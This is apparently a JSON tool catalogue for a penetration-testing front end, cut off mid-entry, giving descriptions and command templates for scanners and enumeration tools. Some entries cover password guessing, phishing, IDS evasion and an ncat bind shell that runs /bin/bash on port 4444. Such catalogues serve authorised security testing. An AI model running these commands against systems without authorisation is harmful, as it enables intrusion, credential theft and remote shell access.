[
  {
    "name": "acccheck",
    "desc": "Attempts to connect to the IPC$ and ADMIN$ shares depending on which flags have been\r\nchosen, and tries a combination of usernames and passwords in the hope to identify\r\nthe password to a given account via a dictionary password guessing attack.",
    "example": "acccehck -t 10.10.10.1 -U users.txt -P password.txt",
    "category": "1",
    "customInput": null,
    "cmd": "acccheck -t ${target} -U ${user_file} -P ${pass_file} ",
    "parser": null
  },
  {
    "name": "ace-voip",
    "desc": "ACE (Automated Corporate Enumerator) is a simple yet powerful VoIP Corporate Directory enumeration tool that mimics the behavior of an IP Phone in order to download the name and extension entries that a given phone can display on its screen interface. In the same way that the “corporate directory” feature of VoIP hardphones enables users to easily dial by name via their VoIP handsets, ACE was developed as a research idea born from “VoIP Hopper” to automate VoIP attacks that can be targeted against names in an enterprise Directory. The concept is that in the future, attacks will be carried out against users based on their name, rather than targeting VoIP traffic against random RTP audio streams or IP addresses. ACE works by using DHCP, TFTP, and HTTP in order to download the VoIP corporate directory. It then outputs the directory to a text file, which can be used as input to other VoIP assessment tools.",
    "example": "Mode to automatically discover TFTP Server IP via DHCP Option 150 (-m)\r\nExample: ace -i eth0 -m 00:1E:F7:28:9C:8e",
    "category": "1",
    "customInput": null,
    "cmd": "ace -i ${interface} -m ${target_mac} ",
    "parser": null
  },
  {
    "name": "Amp",
    "desc": "Amap was the first next-generation scanning tool for pentesters. It attempts to identify applications even if they are running on a different port than normal.\r\nIt also identifies non-ascii based applications. This is achieved by sending trigger packets, and looking up the responses in a list of response strings.",
    "example": "amap -bqv 192.168.1.15 80",
    "category": "1",
    "customInput": null,
    "cmd": "amap -bqv ${target} ${port} ",
    "parser": null
  },
  {
    "name": "APT2 (INTERACTIVE)",
    "desc": "An Automated Penetration Testing Toolkit.\r\nThis tool will perform an NMap scan, or import the results of a scan from Nexpose, Nessus, or NMap. The processesd results will be used to launch exploit and enumeration modules according to the configurable Safe Level and enumerated service information.\r\nAll module results are stored on localhost and are part of APT2’s Knowledge Base (KB). The KB is accessible from within the application and allows the user to view the harvested results of an exploit module.",
    "example": "apt2 -s 0 --target 192.168.103.128",
    "category": "1",
    "customInput": null,
    "cmd": "apt2 -s 0 --target ${target} ",
    "parser": null
  },
  {
    "name": "arp-scan",
    "desc": "The ARP Scanner",
    "example": "Scan the local network, using the information from the primary network interface.\r\narp-scan -l\r\n\r\nScan a subnet, specifying the interface to use and a custom source MAC address.\r\narp-scan -I eth0 --srcaddr=DE:AD:BE:EF:CA:FE 192.168.86.0/24",
    "category": "1",
    "customInput": null,
    "cmd": "arp-scan -l",
    "parser": null
  },
  {
    "name": "Automater",
    "desc": "Automater is a URL/Domain, IP Address, and Md5 Hash OSINT tool aimed at making the analysis process easier for intrusion Analysts. Given a target (URL, IP, or HASH) or a file full of targets Automater will return relevant results from sources like the following: IPvoid.com, Robtex.com, Fortiguard.com, unshorten.me, Urlvoid.com, Labs.alienvault.com, ThreatExpert, VxVault, and VirusTotal.",
    "example": "Use robtex as the source (-s) to scan for information on IP address 50.116.53.73:\r\nautomater -s robtex 50.116.53.73",
    "category": "1",
    "customInput": null,
    "cmd": "automater -s robtex ${target} ",
    "parser": null
  },
  {
    "name": "braa",
    "desc": "Braa is a mass snmp scanner. The intended usage of such a tool is of course making SNMP queries – but unlike snmpget or snmpwalk from net-snmp, it is able to query dozens or hundreds of hosts simultaneously, and in a single process. Thus, it consumes very few system resources and does the scanning VERY fast.\r\nBraa implements its OWN snmp stack, so it does NOT need any SNMP libraries like net-snmp. The implementation is very dirty, supports only several data types, and in any case cannot be stated ‘standard-conforming’! It was designed to be fast, and it is fast. For this reason (well, and also because of my laziness ;), there is no ASN.1 parser in braa – you HAVE to know the numerical values of OID’s (for instance .1.3.6.1.2.1.1.5.0 instead of system.sysName.0).",
    "example": "Walk the SNMP tree on 192.168.1.215 using the community string of public, querying all OIDs under .1.3.6:\r\nbraa public@192.168.1.215:.1.3.6.*",
    "category": "1",
    "customInput": null,
    "cmd": "braa public@${target}:.1.3.6.*",
    "parser": null
  },
  {
    "name": "CaseFile",
    "desc": "CaseFile is the little brother to Maltego. It targets a unique market of ‘offline’ analysts whose primary sources of information are not gained from the open-source intelligence side or can be programmatically queried. We see these people as investigators and analysts who are working ‘on the ground’, getting intelligence from other people in the team and building up an information map of their investigation.\r\nCaseFile gives you the ability to quickly add, link and analyze data having the same graphing flexibility and performance as Maltego without the use of transforms. CaseFile is roughly a third of the price of Maltego.",
    "example": "GUI",
    "category": "1",
    "customInput": null,
    "cmd": "casefile",
    "parser": null
  },
  {
    "name": "CDPSnarf",
    "desc": "CDPSnarf is a network sniffer exclusively written to extract information from CDP packets.\r\nIt provides all the information a “show cdp neighbors detail” command would return on a Cisco router and even more.",
    "example": "Sniff on interface eth0 (-i) and write the capture to a file named cdpsnarf.pcap (-w):\r\ncdpsnarf -i eth0 -w cdpsnarf.pcap",
    "category": "1",
    "customInput": null,
    "cmd": "cdpsnarf -i ${interface} -w cdpsnarf.pcap",
    "parser": null
  },
  {
    "name": "cisco-torch",
    "desc": "Cisco Torch mass scanning, fingerprinting, and exploitation tool was written while working on the next edition of the “Hacking Exposed Cisco Networks”, since the tools available on the market could not meet our needs.\r\nThe main feature that makes Cisco-torch different from similar tools is the extensive use of forking to launch multiple scanning processes on the background for maximum scanning efficiency. Also, it uses several methods of application layer fingerprinting simultaneously, if needed. We wanted something fast to discover remote Cisco hosts running Telnet, SSH, Web, NTP and SNMP services and launch dictionary attacks against the services discovered.",
    "example": "Run all available scan types (-A) against the target IP address (192.168.99.202):\r\ncisco-torch -A 192.168.99.202",
    "category": "1",
    "customInput": null,
    "cmd": "cisco-torch -A ${target} ",
    "parser": null
  },
  {
    "name": "Cookie Cadger",
    "desc": "Cookie Cadger helps identify information leakage from applications that utilize insecure HTTP GET requests.\r\nWeb providers have started stepping up to the plate since Firesheep was released in 2010. Today, most major websites can provide SSL/TLS during all transactions, preventing cookie data from leaking over wired Ethernet or insecure Wi-Fi. But the fact remains that Firesheep was more of a toy than a tool. Cookie Cadger is the first open-source pen-testing tool ever made for intercepting and replaying specific insecure HTTP GET requests into a browser.\r\nCookie Cadgers Request Enumeration Abilities\r\nCookie Cadger is a graphical utility which harnesses the power of the Wireshark suite and Java to provide a fully cross-platform, entirely open- source utility which can monitor wired Ethernet, insecure Wi-Fi, or load a packet capture file for offline analysis.",
    "example": "Example usage:\r\njava -jar CookieCadger.jar \r\n    --tshark=/usr/sbin/tshark\r\n    --headless=on\r\n    --interfacenum=2    (requires --headless=on)\r\n    --detection=on\r\n    --demo=on\r\n    --update=on\r\n    --dbengine=mysql    (default is 'sqlite' for local, file-based storage)\r\n    --dbhost=localhost  (requires --dbengine=mysql)\r\n    --dbuser=user       (requires --dbengine=mysql)\r\n    --dbpass=pass       (requires --dbengine=mysql)\r\n    --dbname=cadgerdata (requires --dbengine=mysql)\r\n    --dbrefreshrate=15  (in seconds, requires --dbengine=mysql, requires --headless=off)",
    "category": "1",
    "customInput": null,
    "cmd": "cookie-cadger",
    "parser": null
  },
  {
    "name": "copy-router-config",
    "desc": "Copies configuration files from Cisco devices running SNMP.",
    "example": "Copy the config from the router (192.168.1.1) to the TFTP server (192.168.1.15), authenticating with the community string (private):\r\ncopy-router-config.pl 192.168.1.1 192.168.1.15 private",
    "category": "1",
    "customInput": null,
    "cmd": "copy-router-config.pl ${target} localhost private",
    "parser": null
  },
  {
    "name": "DMitry",
    "desc": "DMitry (Deepmagic Information Gathering Tool) is a UNIX/(GNU)Linux Command Line Application coded in C. DMitry has the ability to gather as much information as possible about a host. Base functionality is able to gather possible subdomains, email addresses, uptime information, tcp port scan, whois lookups, and more.",
    "example": "Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:\r\ndmitry -winsepo example.txt example.com\r\n",
    "category": "1",
    "customInput": null,
    "cmd": "dmitry -winsepo ${working_dir}/intel/dmitry_out.txt ${target} ",
    "parser": null
  },
  {
    "name": "dnmap (NOT DONE)",
    "desc": "dnmap is a framework to distribute nmap scans among several clients. It reads an already created file with nmap commands and send those commands to each client connected to it.\r\n\r\nThe framework use a client/server architecture. The server knows what to do and the clients do it. All the logic and statistics are managed in the server. Nmap output is stored on both server and client.\r\nUsually you would want this if you have to scan a large group of hosts and you have several different internet connections (or friends that want to help you).",
    "example": "dnmap_client -s 192.168.1.15 -a dnmap-client1",
    "category": "1",
    "customInput": null,
    "cmd": "",
    "parser": null
  },
  {
    "name": "dnsenum",
    "desc": "Multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.",
    "example": "dnsenum --noreverse -o mydomain.xml example.com\r\n",
    "category": "1",
    "customInput": null,
    "cmd": "dnsenum --noreverse -o dnsenum_out.xml ${target} ",
    "parser": null
  },
  {
    "name": "dnsmap",
    "desc": "dnsmap was originally released back in 2006 and was inspired by the fictional story “The Thief No One Saw” by Paul Craig, which can be found in the book “Stealing the Network – How to 0wn the Box”.\r\ndnsmap is mainly meant to be used by pentesters during the information gathering/enumeration phase of infrastructure security assessments. During the enumeration stage, the security consultant would typically discover the target company’s IP netblocks, domain names, phone numbers, etc …\r\nSubdomain brute-forcing is another technique that should be used in the enumeration stage, as it’s especially useful when other domain enumeration techniques such as zone transfers don’t work (I rarely see zone transfers being publicly allowed these days by the way).",
    "example": "Scan example.com using a wordlist (-w /usr/share/wordlists/dnsmap.txt)\r\ndnsmap example.com -w /usr/share/wordlists/dnsmap.txt",
    "category": "1",
    "customInput": null,
    "cmd": "dnsmap ${target} -w /usr/share/wordlists/dnsmap.txt",
    "parser": null
  },
  {
    "name": "DNSRecon (NOT DONE)",
    "desc": "",
    "example": "",
    "category": "1",
    "customInput": null,
    "cmd": "",
    "parser": null
  },
  {
    "name": "dnstracer",
    "desc": "dnstracer determines where a given Domain Name Server (DNS) gets its information from for a given hostname, and follows the chain of DNS servers back to the authoritative answer.",
    "example": "Scan a domain (example.com), retry up to 3 times (-r 3), and display verbose output (-v):\r\ndnstracer -r 3 -v example.com",
    "category": "1",
    "customInput": null,
    "cmd": "dnstracer -r 3 -v ${target} ",
    "parser": null
  },
  {
    "name": "enum4linux",
    "desc": "A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.\r\n\r\nOverview:\r\nEnum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com.\r\nIt is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.\r\nThe tool usage can be found below followed by examples, previous versions of the tool can be found at the bottom of the page.\r\n\r\nKey features:\r\nRID cycling (When RestrictAnonymous is set to 1 on Windows 2000)\r\nUser listing (When RestrictAnonymous is set to 0 on Windows 2000)\r\nListing of group membership information\r\nShare enumeration\r\nDetecting if host is in a workgroup or a domain\r\nIdentifying the remote operating system\r\nPassword policy retrieval (using polenum)",
    "example": "Attempt to get the userlist (-U) and OS information (-o) from the target (192.168.1.200):\r\nenum4linux -U -o 192.168.1.200",
    "category": "1",
    "customInput": null,
    "cmd": "enum4linux -U -o -a ${target} ",
    "parser": null
  },
  {
    "name": "dnswalk",
    "desc": "dnswalk is a DNS debugger. It performs zone transfers of specified domains, and checks the database in numerous ways for internal consistency, as well as accuracy.",
    "example": "Attempt to get DNS zone information from the target domain (example.com.):\r\ndnswalk example.com",
    "category": "1",
    "customInput": null,
    "cmd": "dnswalk ${target} ",
    "parser": null
  },
  {
    "name": "enumIAX",
    "desc": "enumIAX is an Inter Asterisk Exchange protocol username brute-force enumerator. enumIAX may operate in two distinct modes; Sequential Username Guessing or Dictionary Attack.",
    "example": "Run a dictionary attack (-d /usr/share/wordlists/metasploit/unix_users.txt) against the target host (192.168.1.1):\r\nenumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1",
    "category": "1",
    "customInput": null,
    "cmd": "enumiax -d ${user_file} ${target} ",
    "parser": null
  },
  {
    "name": "EyeWitness",
    "desc": "EyeWitness is designed to take screenshots of websites, RDP services, and open VNC servers, provide some server header info, and identify default credentials if possible.",
    "example": "eyewitness -f /root/urls.txt -d screens --all-protocols ",
    "category": "1",
    "customInput": null,
    "cmd": "eyewitness -f /root/urls.txt -d screens --all-protocols ",
    "parser": null
  },
  {
    "name": "Faraday (NOT DONE)",
    "desc": "",
    "example": "",
    "category": "1",
    "customInput": null,
    "cmd": "",
    "parser": null
  },
  {
    "name": "Fierce",
    "desc": "Fierce is a semi-lightweight scanner that helps locate non-contiguous\r\nIP space and hostnames against specified domains.  It's really meant\r\nas a pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all\r\nof those require that you already know what IP space you are looking\r\nfor.  This does not perform exploitation and does not scan the whole\r\ninternet indiscriminately.  It is meant specifically to locate likely\r\ntargets both inside and outside a corporate network.  Because it uses\r\nDNS primarily you will often find mis-configured networks that leak\r\ninternal address space. That's especially useful in targeted malware.",
    "example": "fierce -dns example.com",
    "category": "1",
    "customInput": null,
    "cmd": "fierce -dns ${target} ",
    "parser": null
  },
  {
    "name": "Firewalk",
    "desc": "Firewalk is an active reconnaissance network security tool that attempts to determine what layer 4 protocols a given IP forwarding device will pass. Firewalk works by sending out TCP or UDP packets with a TTL one greater than the targeted gateway. If the gateway allows the traffic, it will forward the packets to the next hop where they will expire and elicit an ICMP_TIME_EXCEEDED message. If the gateway hostdoes not allow the traffic, it will likely drop the packets on the floor and we will see no response.\r\nTo get the correct IP TTL that will result in expired packets one beyond the gateway we need to ramp up hop-counts. We do this in the same manner that traceroute works. Once we have the gateway hopcount (at that point the scan is said to be `bound`) we can begin our scan.\r\nIt is significant to note the fact that the ultimate destination host does not have to be reached. It just needs to be somewhere downstream, on the other side of the gateway, from the scanning host.",
    "example": "Scan ports 8079-8081 (-S8079-8081) through the eth0 interface (-i eth0), do not resolve hostnames (-n), use TCP (-pTCP) via the gateway (192.168.1.1) against the target IP (192.168.0.1):\r\nfirewalk -S8079-8081  -i eth0 -n -pTCP 192.168.1.1 192.168.0.1",
    "category": "1",
    "customInput": null,
    "cmd": "firewalk -S8079-8081 -i ${interface} -n -pTCP ${gateway} ${target} ",
    "parser": null
  },
  {
    "name": "fragroute",
    "desc": "fragroute intercepts, modifies, and rewrites egress traffic destined for a specified host, implementing most of the attacks described in the Secure Networks “Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection” paper of January 1998.\r\nIt features a simple ruleset language to delay, duplicate, drop, fragment, overlap, print, reorder, segment, source-route, or otherwise monkey with all outbound packets destined for a target host, with minimal support for randomized or probabilistic behaviour.\r\nThis tool was written in good faith to aid in the testing of network intrusion detection systems, firewalls, and basic TCP/IP stack behaviour. Please do not abuse this software.",
    "example": "fragroute 192.168.1.123",
    "category": "1",
    "customInput": null,
    "cmd": "fragroute ${target} ",
    "parser": null
  },
  {
    "name": "fragrouter",
    "desc": "Fragrouter is a network intrusion detection evasion toolkit. It implements most of the attacks described in the Secure Networks “Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection” paper of January 1998.\r\nThis program was written in the hopes that a more precise testing methodology might be applied to the area of network intrusion detection, which is still a black art at best.\r\nConceptually, fragrouter is just a one-way fragmenting router – IP packets get sent from the attacker to the fragrouter, which transforms them into a fragmented data stream to forward to the victim.",
    "example": "Using interface eth0 (-i eth0), send ordered 8-byte IP fragments (-F1):\r\nfragrouter -i eth0 -F1",
    "category": "1",
    "customInput": null,
    "cmd": "fragrouter -i ${interface} -F1",
    "parser": null
  },
  {
    "name": "Ghost Phisher",
    "desc": "Ghost Phisher is a Wireless and Ethernet security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library, the program is able to emulate access points and deploy.\r\nHTTP Server\r\nInbuilt RFC 1035 DNS Server\r\nInbuilt RFC 2131 DHCP Server\r\nWebpage Hosting and Credential Logger (Phishing)\r\nWifi Access point Emulator\r\nSession Hijacking (Passive and Ethernet Modes)\r\nARP Cache Poisoning (MITM and DOS Attacks)\r\nPenetration using Metasploit Bindings\r\nAutomatic credential logging using SQlite Database\r\nUpdate Support",
    "example": "ghost-phisher",
    "category": "1",
    "customInput": null,
    "cmd": "ghost-phisher",
    "parser": null
  },
  {
    "name": "GoLismero",
    "desc": "GoLismero is an open source framework for security testing. It’s currently geared towards web security, but it can easily be expanded to other kinds of scans.\r\n\r\nThe most interesting features of the framework are:\r\nReal platform independence. Tested on Windows, Linux, *BSD and OS X.\r\nNo native library dependencies. All of the framework has been written in pure Python.\r\nGood performance when compared with other frameworks written in Python and other scripting languages.\r\nVery easy to use.\r\nPlugin development is extremely simple.\r\nThe framework also collects and unifies the results of well known tools: sqlmap, xsser, openvas, dnsrecon, theharvester\r\nIntegration with standards: CWE, CVE and OWASP.\r\nDesigned for cluster deployment in mind (not available yet).",
    "example": "Run a vulnerability scan (scan) against the targets in the input file (-i /root/port80.xml), saving the output to a file (-o sub1-port80.html):\r\ngolismero scan -i /root/port80.xml -o sub1-port80.html",
    "category": "1",
    "customInput": null,
    "cmd": "golismero scan -i /root/port80.xml -o sub1-port80.html",
    "parser": null
  },
  {
    "name": "goofile",
    "desc": "Use this tool to search for a specific file type in a given domain.",
    "example": "Search for files from a domain (-d kali.org) of the PDF filetype (-f pdf):\r\ngoofile -d kali.org -f pdf",
    "category": "1",
    "customInput": "File extension=${arg1}",
    "cmd": "goofile -d ${target} -f ${arg1}",
    "parser": null
  },
  {
    "name": "hping3-traceroute",
    "desc": "hping is a command-line oriented TCP/IP packet assembler/analyzer. The interface is inspired to the ping(8) unix command, but hping isn’t only able to send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols, has a traceroute mode, the ability to send files between a covered channel, and many other features.",
    "example": "Use traceroute mode (–traceroute), be verbose (-V) in ICMP mode (-1) against the target (www.example.com):\r\nhping3 --traceroute -V -1 www.example.com",
    "category": "1",
    "customInput": null,
    "cmd": "hping3 --traceroute -V -1 ${target} ",
    "parser": null
  },
  {
    "name": "hping3-ping",
    "desc": "Testing ICMP: In this example hping3 will behave like a normal ping utility, sending ICMP-echo und receiving ICMP-reply",
    "example": "hping3 -1 0daysecurity.com",
    "category": "1",
    "customInput": null,
    "cmd": "hping3 -1 ${target} ",
    "parser": null
  },
  {
    "name": "hping3-ping-port",
    "desc": "Checking port: Here hping3 will send a Syn packet to a specified port (80 in our example). We can control also from which local port will start the scan (5050).",
    "example": "hping3 -V -S -p 80 -s 5050 0daysecurity.com",
    "category": "1",
    "customInput": null,
    "cmd": "hping3 -V -S -p 80 -s 5050 ${target} ",
    "parser": null
  },
  {
    "name": "hping3-traceroute-port",
    "desc": "Traceroute to a determined port: A nice feature from Hping3 is that you can do a traceroute to a specified port watching where your packet is blocked. It can just be done by adding --traceroute to the last command.",
    "example": "hping3 --traceroute -V -S -p 80 -s 5050 0daysecurity.com",
    "category": "1",
    "customInput": null,
    "cmd": "hping3 --traceroute -V -S -p 80 -s 5050 ${target} ",
    "parser": null
  },
  {
    "name": "hping3-ping-mask",
    "desc": "Other types of ICMP: This example sends a ICMP address mask request ( Type 17 ).",
    "example": "hping3 -c 1 -V -1 -C 17 0daysecurity.com",
    "category": "1",
    "customInput": null,
    "cmd": "hping3 -c 1 -V -1 -C 17 ${target} ",
    "parser": null
  },
  {
    "name": "hping3-FIN-scan",
    "desc": "Other types of Port Scanning: First type we will try is the FIN scan. In a TCP connection the FIN flag is used to start the connection closing routine. If we do not receive a reply, that means the port is open. Normally firewalls send a RST+ACK packet back to signal that the port is closed.",
    "example": "hping3 -c 1 -V -p 80 -s 5050 -F 0daysecurity.com",
    "category": "1",
    "customInput": null,
    "cmd": "hping3 -c 1 -V -p 80 -s 5050 -F ${target} ",
    "parser": null
  },
  {
    "name": "hping3-ACK-scan",
    "desc": "Ack Scan: This scan can be used to see if a host is alive (when Ping is blocked for example). This should send a RST response back if the port is open.",
    "example": "hping3 -c 1 -V -p 80 -s 5050 -A 0daysecurity.com",
    "category": "1",
    "customInput": null,
    "cmd": "hping3 -c 1 -V -p 80 -s 5050 -A ${target} ",
    "parser": null
  },
  {
    "name": "ident-user-enum",
    "desc": "ident-user-enum is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system.\r\nThis can help to prioritise target service during a pentest (you might want to attack services running as root first). Alternatively, the list of usernames gathered can be used for password guessing attacks on other network services.",
    "example": "Scan the remote host (192.168.1.13) and determine which user is running the service on the specified ports (22 139 445).\r\nident-user-enum 192.168.1.13 22 139 445",
    "category": "1",
    "customInput": "Ports to scan aeparated by spaces=${arg1}",
    "cmd": "ident-user-enum ${target} ${arg1} ",
    "parser": null
  },
  {
    "name": "InSpy",
    "desc": "InSpy is a Python-based LinkedIn enumeration tool with two functionalities: TechSpy and EmpSpy. TechSpy crawls LinkedIn job listings for technologies used by the target company. InSpy attempts to identify technologies by matching job descriptions to keywords from a newline-delimited file.\r\nEmpSpy crawls LinkedIn for employees working at the provided company. InSpy searches for employees by title and/or department from a newline-delimited file. InSpy may also create emails for the identified employees if the user specifies an email format.",
    "example": "Search LinkedIn for google employees (–empspy) with the provided wordlist of job titles (/usr/share/inspy/wordlists/title-list-large.txt).\r\ninspy --empspy /usr/share/inspy/wordlists/title-list-large.txt google",
    "category": "1",
    "customInput": "Job title list file=${arg1}",
    "cmd": "inspy --empspy ${arg1} ${target} ",
    "parser": null
  },
  {
    "name": "InTrace",
    "desc": "InTrace is a traceroute-like application that enables users to enumerate IP hops exploiting existing TCP connections, both initiated from local network (local system) or from remote hosts. It could be useful for network reconnaissance and firewall bypassing.",
    "example": "Run a trace to the target host (-h www.example.com) using port 80 (-p 80) with a packet size of 4 bytes (-s 4):\r\nintrace -h www.example.com -p 80 -s 4",
    "category": "1",
    "customInput": null,
    "cmd": "intrace -h ${target} -p ${port} -s 4",
    "parser": null
  },
  {
    "name": "iSMTP",
    "desc": "Test for SMTP user enumeration (RCPT TO and VRFY), internal spoofing, and relay.",
    "example": "Test a list of IPs from a file (-f smtp-ips.txt) enumerating usernames from a dictionary file (-e /usr/share/wordlists/metasploit/unix_users.txt):\r\nismtp -f smtp-ips.txt -e /usr/share/wordlists/metasploit/unix_users.txt",
    "category": "1",
    "customInput": null,
    "cmd": "ismtp -h ${target} -e ${user_file} ",
    "parser": null
  },
  {
    "name": "lbd",
    "desc": "lbd (load balancing detector) detects if a given domain uses DNS and/or HTTP Load-Balancing (via Server: and Date: header and diffs between server answers).",
    "example": "Test to see if the target domain (example.com) is using a load balancer:\r\nlbd example.com",
    "category": "1",
    "customInput": null,
    "cmd": "lbd ${target} ",
    "parser": null
  },
  {
    "name": "Maltego (NOT DONE)",
    "desc": "",
    "example": "",
    "category": "1",
    "customInput": null,
    "cmd": "",
    "parser": null
  },
  {
    "name": "masscan",
    "desc": "This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second.\r\nIt produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand, unicornscan, and ZMap, using asynchronous transmission. The major difference is that it’s faster than these other scanners. In addition, it’s more flexible, allowing arbitrary address ranges and port ranges.\r\nNOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.",
    "example": "Scan for a selection of ports (-p22,80,445) across a given subnet (192.168.1.0/24):\r\nmasscan -p22,80,445 192.168.1.0/24",
    "category": "1",
    "customInput": null,
    "cmd": "masscan -p${port} ${target} ",
    "parser": null
  },
  {
    "name": "Metagoofil",
    "desc": "Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) belonging to a target company.\r\nMetagoofil will perform a search in Google to identify and download the documents to local disk and then will extract the metadata with different libraries like Hachoir, PdfMiner? and others. With the results it will generate a report with usernames, software versions and servers or machine names that will help Penetration testers in the information gathering phase.",
    "example": "Scan for documents from a domain (-d kali.org) that are PDF files (-t pdf), searching 100 results (-l 100), download 25 files (-n 25), saving the downloads to a directory (-o kalipdf), and saving the output to a file (-f kalipdf.html):\r\nmetagoofil -d kali.org -t pdf -l 100 -n 25 -o kalipdf -f kalipdf.html",
    "category": "1",
    "customInput": "File extension=${arg1}",
    "cmd": "metagoofil -d ${target} -t ${arg1} -l 100 -n 25 -f metagoofil_out.html",
    "parser": null
  },
  {
    "name": "Miranda (INTERACTIVE)",
    "desc": "Miranda is a Python-based Universal Plug-N-Play client application designed to discover, query and interact with UPNP devices, particularly Internet Gateway Devices (aka, routers). It can be used to audit UPNP-enabled devices on a network for possible vulnerabilities. ",
    "example": "Start on interface eth0 (-i eth0) in verbose mode (-v), then start discovery mode (msearch):\r\nmiranda -i eth0 -v",
    "category": "1",
    "customInput": "",
    "cmd": "miranda -i ${interface} -v",
    "parser": null
  },
  {
    "name": "nbtscan-unixwiz",
    "desc": "This is a command-line tool that scans for open NETBIOS nameservers on a local or remote TCP/IP network, and this is a first step in finding of open shares. It is based on the functionality of the standard Windows tool nbtstat, but it operates on a range of addresses instead of just one.",
    "example": "Scan a range of IP addresses (192.168.0.100-110) without doing inverse name lookups (-n):\r\nnbtscan-unixwiz -n 192.168.0.100-110",
    "category": "1",
    "customInput": "",
    "cmd": "nbtscan-unixwiz -n ${target} ",
    "parser": null
  },
  {
    "name": "Nikto",
    "desc": "Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.",
    "example": "nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 192.168.0.102",
    "category": "1",
    "customInput": "",
    "cmd": "nikto -Display 1234EP -Format htm -Tuning 123bde -host ${target} ",
    "parser": null
  },
  {
    "name": "Nmap",
    "desc": "Targets may be specified as hostnames, IP addresses, networks, etc.\r\nEx: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.*.1-24",
    "example": "Scan in verbose mode (-v), enable OS detection, version detection, script scanning, and traceroute (-A), with version detection (-sV) against the target IP (192.168.1.1):\r\nnmap -v -A -sV 192.168.1.1",
    "category": "1",
    "customInput": "",
    "cmd": "nmap -v -A -sV ${target} ",
    "parser": "nmap"
  },
  {
    "name": "ndiff ",
    "desc": "Diff two nmap result files.",
    "example": "Compare yesterday’s port scan (yesterday.xml) with the scan from today (today.xml):\r\nndiff yesterday.xml today.xml",
    "category": "1",
    "customInput": "File1=${arg1},File2=${arg2},",
    "cmd": "ndiff ${arg1} ${arg2} ",
    "parser": null
  },
  {
    "name": "ncat-bash-listener",
    "desc": "",
    "example": "Be verbose (-v), running /bin/bash on connect (–exec “/bin/bash”), only allowing 1 IP address (–allow 192.168.1.123), listen on TCP port 4444 (-l 4444), and keep the listener open on disconnect (–keep-open):\r\nncat -v --exec \"/bin/bash\" --allow 192.168.1.123 -l 4444 --keep-open",
    "category": "1",
    "customInput": "",
    "cmd": "ncat -v --exec \"/bin/bash\" --allow ${target} -l 4444 --keep-open",
    "parser": null
  },
  {
    "name": "nping-specific-port",
    "desc": "Custom ping tool from nmap suite",
    "example": "Using TCP mode (–tcp) to probe port 22 (-p 22) using the SYN flag (–flags syn) with a TTL of 2 (–ttl 2) on the remote host (192.168.1.1):\r\nnping --tcp -p 22 --flags syn --ttl 2 192.168.1.1",
    "category": "1",
    "customInput": "Set TCP flags (ACK,PSH,RST,SYN,FIN...)=${arg1},",
    "cmd": "nping --tcp -p ${port} --flags ${arg1} --ttl 2 ${target} ",
    "parser": null
  },
  {
    "name": "ntop",
    "desc": "ntop is a tool that shows the network usage, similar to what the popular top Unix command does. ntop is based on pcapture (ftp://ftp.ee.lbl.gov/pcapture.tar.Z) and it has been written in a portable way in order to virtually run on every Unix platform.",
    "example": "Display network usage, filtering for a specific IP address (-B “src host 192.168.1.1”):\r\nntop -B \"src host 192.168.1.1\"",
    "category": "1",
    "customInput": "",
    "cmd": "ntop -B \"src host ${target} \"",
    "parser": null
  },
  {
    "name": "OSRFramework-usufy",
    "desc": "Checks for a user profile in up to 290 different platforms",
    "example": "Check for the -n kalilinux username across all available services:\r\nusufy.py -n kalilinux",
    "category": "1",
    "customInput": "Username to check for=${arg1},",
    "cmd": "usufy.py -n ${arg1} ",
    "parser": null
  },
  {
    "name": "OSRFramework-mailfy",
    "desc": "Search for a given email address.",
    "example": "mailfy.py -n ltorvalds",
    "category": "1",
    "customInput": "Username to serach for=${arg1},",
    "cmd": "mailfy.py -n ${arg1} ",
    "parser": null
  },
  {
    "name": "OSRFramework-searchfy",
    "desc": "Search for a given string across all OSRF services.",
    "example": "searchfy.py -q \"dookie2000ca\"",
    "category": "1",
    "customInput": "OSRF String=${arg1},",
    "cmd": "searchfy.py -q \"${arg1}\"",
    "parser": null
  },
  {
    "name": "p0f",
    "desc": "P0f is a tool that utilizes an array of sophisticated, purely passive traffic fingerprinting mechanisms to identify the players behind any incidental TCP/IP communications (often as little as a single normal SYN) without interfering in any way. Version 3 is a complete rewrite of the original codebase, incorporating a significant number of improvements to network-level fingerprinting, and introducing the ability to reason about application-level payloads (e.g., HTTP).",
    "example": "Use interface eth0 (-i eth0) in promiscuous mode (-p), saving the results to a file (-o /tmp/p0f.log):\r\np0f -i eth0 -p -o /tmp/p0f.log",
    "category": "1",
    "customInput": "",
    "cmd": "p0f -i ${interface} -p",
    "parser": null
  },
  {
    "name": "Parsero",
